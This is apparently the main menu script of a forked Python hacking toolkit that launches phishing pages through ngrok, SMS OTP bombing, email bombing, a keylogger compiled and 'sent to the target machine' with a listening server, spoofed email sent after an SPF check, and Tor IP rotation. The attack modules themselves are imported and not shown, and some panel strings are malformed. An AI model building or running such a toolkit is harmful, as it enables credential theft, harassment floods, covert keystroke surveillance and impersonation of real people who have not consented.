"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""

# =============================================================================================
# IMPORTS:

from colorama import Fore, Style, init

from includes import banner, utils, config_status
from includes.menu import main_menu

from AttackModes import phishing, keylogger, spfattack, otpboming, emailboming, ipchanger

from rich.console import Console
from rich.panel import Panel

import os, sys

# =============================================================================================

init(autoreset=True)

console = Console()

utils.check_sudo()

while True:
    
    banner.show_banner()
    
    choice = main_menu()
     
    if choice == 0:

        console.print("[red]👋 Goodbye![/red]")
        
        sys.exit(0)

    elif choice == 1:

        utils.kill_port(80)
        
        config_status.check_ngrok()
        
        selected_template = utils.choose_template()
        if selected_template:
            phishing.pish(selected_template)

        else:
            print("🔙 Returning to main menu...")
    
    elif choice == 2:
        
        result = otpboming.getio()
        if result:
            country_code, mobile_no, otpcount = result
            banner.cls()
            banner.show_banner()
            otpboming.sendotp(country_code, mobile_no, otpcount)

        else:
            print("🔙 Returning to main menu...")

    elif choice == 3:
            
        selected = keylogger.user_option()
        if selected == '1':

            result = keylogger.getio()
            if result:
                
                os_type = result
                apppath = keylogger.compile_app(os_type)
                
                if apppath:
                    banner.show_banner()
                    appname = os.path.basename(apppath)
                    console.print(Panel.fit("""
                    
                    f"[bold green]✅ Keylogger compiled successfully![/bold green]"
       
                    f"👉 Output File: {apppath}"

                    f"📤 Send this file to the target machine."

                    f"💻 Run it using: ./[bold yellow]{appname}[/bold yellow] <your IP>\n",

                    border_style="magenta"
                    
                    """))

                    input("🔙 Press Enter to start listner ...")
                    
                    banner.show_banner()
                    keylogger.start_keylogger_server()
                
            else:
                print("❌ User exited.")
            
        elif selected == '2':
            keylogger.start_keylogger_server()
        
        elif selected == 'x':
            print("Exiting...")
            
    elif choice == 4:
        
        result = emailboming.getio()
        if result:
            emailboming.sendotp(*result)
        
        else:
            print("🔙 Returning to main menu...")

    elif choice == 5:
            
        result = spfattack.getio()
        if result:

            emailid = result

            spf = spfattack.check_spf(emailid)
            print(spf)

            if spf == "Vulnerable to spoofing":
                
                console.print(Panel.fit(
                    f"[bold green]✅ SPF Check Completed![/bold green]\n\n"
                    f"👉 Email ID: {emailid}\n"
                    f"👉 Status: {spf}\n"
                    f"👉 Enter to Address to send Fake email: \n",
                    border_style="magenta"
                ))

                to_email = spfattack.get_emailidto()
                if to_email == "exit":
                    print("🔙 Returning to main menu...")
                    continue
                
                subject = input("📧 Enter Subject: ").strip() 
                
                msg = input("📧 Enter Message to send: ").strip()    
                
                status = spfattack.send_spoofed_email(emailid, to_email, subject, msg) 
                
                message = status.get("message")
                if status and message == "Email sent successfully":
                    
                    console.print(Panel.fit(
                        f"[bold green]✅ Email sent successfully![/bold green]\n\n"
                        f"👉 From: {emailid}\n"
                        f"👉 To: {to_email}\n"
                        f"👉 Subject: {subject}\n"
                        f"👉 Message: {msg}\n",
                        border_style="magenta"
                    ))
                    
                    input("🔙 Press Enter to return to the main menu...")
                
                else:
                    console.print(f"[bold red]❌ {message}.[/bold red]")
                    input("🔙 Press Enter to return to the main menu...")
                
            else:
                console.print("[bold red]❌ Failed to check SPF record or Not Vulnerable.[/bold red]")
                input("🔙 Returning to main menu...")
        
        else:
            print("🔙 Returning to main menu...")
    
    elif choice == 6:

        status = ipchanger.start_tor_service()
        if status == True:
        
            console.print(Panel.fit(
                "[bold green]IP Changer[/bold green]",
                border_style = "red"
            ))

            console.print(Panel.fit("""[bold yellow]IP Changer Instructions[/bold yellow]
                " "👉 This tool uses the Tor service to change your public IP.
                " "👉 Enter the interval in seconds for IP rotation (minimum 5 seconds).
                " "👉 During IP change, Tor may throw errors depending on your network or machine configuration.
                " "👉 Use this tool only for educational purposes.
                " "👉 To use in a browser, configure the proxy in Firefox with [bold]IP: 127.0.0.1[/bold] and [bold]Port: 9050[/bold].
                " "❌ Enter [red]'x'[/red] to exit anytime.", border_style="magenta" ))
            """))

            sec = ipchanger.get_sec()              
            if isinstance(sec, int):
                ipchanger.start(sec)
            
            elif sec == "exit":
                print("🔙 Returning to main menu...")
   
    else:

        console.print("[bold red]❌ Invalid selection![/bold red]")